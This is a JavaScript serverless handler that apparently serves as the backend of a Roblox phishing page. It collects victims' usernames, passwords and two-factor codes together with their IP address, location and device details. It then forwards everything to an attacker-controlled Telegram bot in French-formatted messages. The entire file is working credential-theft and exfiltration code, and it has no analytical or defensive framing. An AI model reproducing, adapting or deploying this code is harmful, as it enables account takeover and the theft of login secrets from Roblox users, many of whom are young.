export const config = {
    api: {
        bodyParser: true
    }
};

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendToTelegram(message) {
    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: false
                })
            }
        );
        const data = await response.json();
        return data.ok;
    } catch (error) {
        return false;
    }
}

function formatMessage(data) {
    let message = '';
    if (data.step === 'credentials') {
        message = `
🟦 **ÉTAPE 1 - IDENTIFIANTS ROBLOX** 🟦

👤 **Identifiants**
👤 Nom utilisateur: \`${data.username || 'Non fourni'}\`
🔑 Mot de passe: \`${data.password || '*****'}\`

🌐 **Informations Réseau**
📍 IP: \`${data.ip || 'Non disponible'}\`
🌍 Localisation: \`${data.ipLocation || 'Non disponible'}\`

📱 **Appareil**
🖥️ Modèle: \`${data.deviceModel || 'Inconnu'}\`
🌐 Plateforme: \`${data.platform || 'N/A'}\`
🔋 Batterie: \`${data.batteryLevel || 'N/A'}\`

📅 \`${new Date(data.timestamp).toLocaleString('fr-FR')}\``;
    } else if (data.step === 'verification') {
        message = `
🔴 **ÉTAPE 2 - CODE 2FA ROBLOX** 🔴

🔑 **Code de vérification**
\`\`\`
${data.verification_code || 'Non fourni'}
\`\`\`

📅 \`${new Date(data.timestamp).toLocaleString('fr-FR')}\``;
    }
    return message;
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(204).end();
    if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'POST requis' });

    try {
        const data = req.body;
        let ip = data.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        let ipLocation = 'Non disponible';
        let isVpn = false;

        if (ip) {
            try {
                const ipInfo = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,proxy,hosting`)
                    .then(r => r.json());
                if (ipInfo.status === 'success') {
                    ipLocation = `${ipInfo.country || 'Inconnu'}, ${ipInfo.city || 'Inconnu'}`;
                    isVpn = ipInfo.proxy || ipInfo.hosting || false;
                }
            } catch (error) {}
        }

        const logEntry = { ...data, ip, ipLocation, isVpn };
        await sendToTelegram(formatMessage(logEntry));

        res.status(200).json({ success: true, message: 'Données envoyées à Telegram' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
}
